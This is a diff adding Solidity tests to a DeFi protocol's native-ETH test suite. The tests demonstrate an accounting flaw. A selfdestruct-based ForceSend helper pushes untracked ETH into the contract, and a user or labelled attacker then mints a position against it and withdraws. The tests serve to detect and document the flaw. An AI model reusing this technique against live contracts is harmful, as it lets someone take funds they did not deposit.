@@ -107,6 +107,14 @@ contract TrackedBalanceFlashReceiver is IFlashLoanReceiver {
     receive() external payable {}
 }
 
+contract ForceSend {
+    constructor() payable {}
+
+    function send(address payable to) external {
+        selfdestruct(to);
+    }
+}
+
 contract TrackedBalanceFlashHarness is FlashLoanFacet {
     function initNativePool(uint256 pid, uint16 feeBps, uint256 trackedBalance, uint256 deposits) external {
         Types.PoolData storage p = s().pools[pid];
@@ -231,5 +239,55 @@ contract TrackedBalanceNativeEthPropertyTest is Test {
         assertEq(facet.trackedBalance(PID), trackedBefore + fee, "tracked after flash");
         assertEq(facet.nativeTrackedTotal(), nativeTrackedBefore + fee, "native tracked after flash");
         assertLe(facet.nativeTrackedTotal(), address(facet).balance, "native tracked <= balance");
+    }
+
+    /// Feature: native-eth-support, Property 2: TrackedBalance Invariant
+    /// Demonstrates provenance risk: forced ETH can back permissionless native minting when pre-funded flow is enabled.
+    function test_nativePreFundedProvenance_forcedEthCanBeConsumedByMinter() public {
+        TrackedBalancePositionHarness facet = new TrackedBalancePositionHarness();
+        PositionNFT nft = new PositionNFT();
+        facet.configurePositionNFT(address(nft));
+        nft.setMinter(address(facet));
+        facet.initNativePool(PID, 10_000);
+        facet.setNativeTrackedTotal(0);
+
+        ForceSend sender = new ForceSend{value: 6 ether}();
+        sender.send(payable(address(facet)));
+
+        assertEq(address(facet).balance, 6 ether, "forced ETH arrived");
+        assertEq(facet.nativeTrackedTotal(), 0, "untracked before mint");
+
+        vm.prank(user);
+        uint256 tokenId = facet.mintPositionWithDeposit(PID, 4 ether, 4 ether, 0);
+
+        assertEq(facet.trackedBalance(PID), 4 ether, "tracked after mint");
+        assertEq(facet.totalDeposits(PID), 4 ether, "deposits after mint");
+        assertEq(facet.nativeTrackedTotal(), 4 ether, "native tracked after mint");
+        assertEq(address(facet).balance, 6 ether, "balance unchanged by accounting");
+
+        uint256 userBalanceBefore = user.balance;
+        vm.prank(user);
+        facet.withdrawFromPosition(tokenId, PID, 4 ether, 0);
+        assertEq(user.balance - userBalanceBefore, 4 ether, "user withdrew pre-funded value");
+    }
+
+    /// Feature: native-eth-support, Property 2: TrackedBalance Invariant
+    function test_nativePreFundedProvenance_anyMinterCanConsumeForcedEth() public {
+        address attacker = address(0xBADD);
+        TrackedBalancePositionHarness facet = new TrackedBalancePositionHarness();
+        PositionNFT nft = new PositionNFT();
+        facet.configurePositionNFT(address(nft));
+        nft.setMinter(address(facet));
+        facet.initNativePool(PID, 10_000);
+        facet.setNativeTrackedTotal(0);
+
+        ForceSend sender = new ForceSend{value: 3 ether}();
+        sender.send(payable(address(facet)));
+
+        vm.prank(attacker);
+        facet.mintPositionWithDeposit(PID, 3 ether, 3 ether, 0);
+
+        assertEq(facet.trackedBalance(PID), 3 ether, "attacker consumed forced pre-fund");
+        assertEq(facet.nativeTrackedTotal(), 3 ether, "tracked total follows attacker mint");
     }
 }
